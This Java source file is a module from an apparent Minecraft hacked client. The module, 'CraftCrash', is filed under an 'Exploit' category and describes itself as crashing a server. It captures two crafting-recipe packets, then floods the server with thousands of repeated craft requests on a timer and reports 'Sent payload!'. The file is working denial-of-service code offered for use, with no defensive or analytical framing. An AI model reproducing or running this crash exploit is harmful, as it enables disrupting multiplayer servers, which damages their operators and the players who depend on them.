package net.como.client.module.exploit;

import net.como.client.ComoClient;
import net.como.client.event.EventHandler;
import net.como.client.event.impl.PlayerTickEvent;
import net.como.client.event.impl.SendPacketEvent;
import net.como.client.module.Module;
import net.minecraft.client.gui.screen.ingame.CraftingScreen;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.Recipe;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.screen.ScreenHandler;

public class CraftCrash extends Module {
    // TODO make these settings...
    public int amount = 2000;

    public CraftCrash() {
        this.setDescription("Crashes a server by bombarding it with different recipes.");
        this.setCategory("Exploit");
    }

    private int ticks = 0;

    // Recipes to crash with
    private RecipeEntry<?> first = null;
    private RecipeEntry<?> second = null;

    private void perform(int packets) {
        for (int i = 0; i < packets; i++) {
            this.performCraftRequests();
        }
    }

    private void performCraftRequests() {
        ScreenHandler screenHandler = ComoClient.getInstance().me().currentScreenHandler;
        ClientPlayNetworkHandler networkHandler = ComoClient.getInstance().me().networkHandler;

        int sync = screenHandler.syncId;

        networkHandler.sendPacket(new CraftRequestC2SPacket(sync, first, true));
        networkHandler.sendPacket(new CraftRequestC2SPacket(sync, second, true));
    }

    private boolean isCapturing() {
        return first == null || second == null;
    }

    @EventHandler
    public void onTick(PlayerTickEvent event) {
        // Make sure we're in a crafting table
        if (!(ComoClient.getInstance().getClient().currentScreen instanceof CraftingScreen)) return;

        // Check that we have a recipe to crash with
        if (this.isCapturing()) return;

        ticks++;

        if (ticks % 15 == 0 && ticks < 75) {
            this.info("Disabling stream...");
            this.perform(50);

            return;
        }

        if (ticks % 75 == 0) {
            this.perform(amount);
            this.info("Sent payload!");
        }
    }

    @EventHandler
    public void onPacket(SendPacketEvent event) {
        // Make sure that we're capturing
        if (!this.isCapturing()) return;

        // Get the packet
        Packet<?> packet = event.packet;

        // Make sure that the packet is a craft request
        if (!(packet instanceof CraftRequestC2SPacket)) return;

        // Get the craftRequest packet
        CraftRequestC2SPacket craftRequest = (CraftRequestC2SPacket)packet;

        // Get the recipe
        RecipeEntry<?> recipe = ComoClient.getInstance().getClient().world.getRecipeManager().get(craftRequest.getRecipe()).orElseThrow();

        // Set the first and second recipes
        if (this.first == null) {
            this.first = recipe;
            this.info("Captured first recipe!");
        } else if (this.second == null) {
            this.second = recipe;
            this.info("Captured second recipe!");
        }
    }
}
